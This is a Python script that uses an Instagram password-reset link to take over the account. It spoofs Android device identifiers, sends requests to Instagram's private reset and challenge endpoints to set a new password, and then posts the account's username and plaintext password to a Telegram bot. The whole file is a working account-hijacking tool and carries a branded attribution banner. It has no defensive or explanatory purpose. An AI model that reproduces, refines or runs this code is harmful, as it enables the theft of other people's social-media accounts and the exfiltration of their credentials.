import sys
import json
import argparse
import uuid
import string
import random
import requests
from datetime import datetime


def generate_device_info(custom_password=None):
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    USER_AGENT = (
        f"Instagram 394.0.0.46.81 Android ("
        f"{random.choice(['28/9','29/10','30/11','31/12'])}; "
        f"{random.choice(['240dpi','320dpi','480dpi'])}; "
        f"{random.choice(['720x1280','1080x1920','1440x2560'])}; "
        f"{random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; "
        f"{random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; "
        f"intel; en_US; {random.randint(100000000, 999999999)})"
    )
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.now().timestamp())
    raw_pass = custom_password if custom_password else f'@pass{"".join([str(random.randint(1,100)) for _ in range(4)])}'
    PASSWORD = f"#PWD_INSTAGRAM:0:{timestamp}:{raw_pass}"
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD


def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Content-Length": "9481",
    }


def id_user(user_id):
    try:
        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
        r = requests.get(url, headers={"User-Agent": "Instagram 219.0.0.12.117 Android"}, timeout=10)
        return r.json()["user"]["username"]
    except Exception:
        return str(user_id)


def send_telegram(bot_token, chat_id, text):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        requests.post(url, data={"chat_id": chat_id, "text": text}, timeout=10)
    except Exception:
        pass


def reset_password(reset_link, custom_password=None):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info(custom_password)
        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token  = reset_link.split("&token=")[1].split(":")[0]

        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {
            "source":       "one_click_login_email",
            "uidb36":       uidb36,
            "device_id":    ANDROID_ID,
            "token":        token,
            "waterfall_id": WATERFALL_ID,
        }
        r = requests.post(url, headers=make_headers(user_agent=USER_AGENT), data=data, timeout=20)

        if "user_id" not in r.text:
            return {"success": False, "username": None, "password": None, "error": f"Reset request failed: {r.text}"}

        mid             = r.headers.get("Ig-Set-X-Mid", "")
        resp_json       = r.json()
        user_id         = resp_json.get("user_id")
        cni             = resp_json.get("cni")
        nonce_code      = resp_json.get("nonce_code")
        challenge_context = resp_json.get("challenge_context")

        url2  = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id":    str(user_id),
            "cni":        str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context":   '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context":   str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge":       "true",
        }
        r2 = requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data2, timeout=20).text

        challenge_context_final = (
            r2.replace("\\", "")
            .split(f'(bk.action.i64.Const, {cni}), "')[1]
            .split('", (bk.action.bool.Const, false)))')[0]
        )

        data3 = {
            "is_caa": "False", "source": "", "uidb36": "",
            "error_state": {"type_name": "str", "index": 0, "state_id": 1048583541},
            "afv": "", "cni": str(cni), "token": "", "has_follow_up_screens": "0",
            "bk_client_context": {"bloks_version": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd", "styles_id": "instagram"},
            "challenge_context":   challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1":   PASSWORD,
            "enc_new_password2":   PASSWORD,
        }
        requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data3, timeout=20)

        plain_pass = PASSWORD.split(":")[-1]
        return {"success": True, "username": None, "password": plain_pass, "user_id": user_id}

    except Exception as e:
        return {"success": False, "username": None, "password": None, "error": str(e)}


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--reset-link",      required=True)
    parser.add_argument("--chat-id",         required=True)
    parser.add_argument("--bot-token",       required=True)
    parser.add_argument("--custom-password", default=None)
    args = parser.parse_args()

    result = reset_password(args.reset_link, args.custom_password)

    if result.get("success"):
        user_id  = result.pop("user_id", None)
        username = id_user(user_id) if user_id else None
        result["username"] = username

        msg = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"   WEYN INSTAGRAM RESET PASS\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"USERNAME ➪  {username}\n"
            f"PASSWORD ➪  {result['password']}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"        BY: @jinbelowg\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        send_telegram(args.bot_token, args.chat_id, msg)

    print(json.dumps(result))
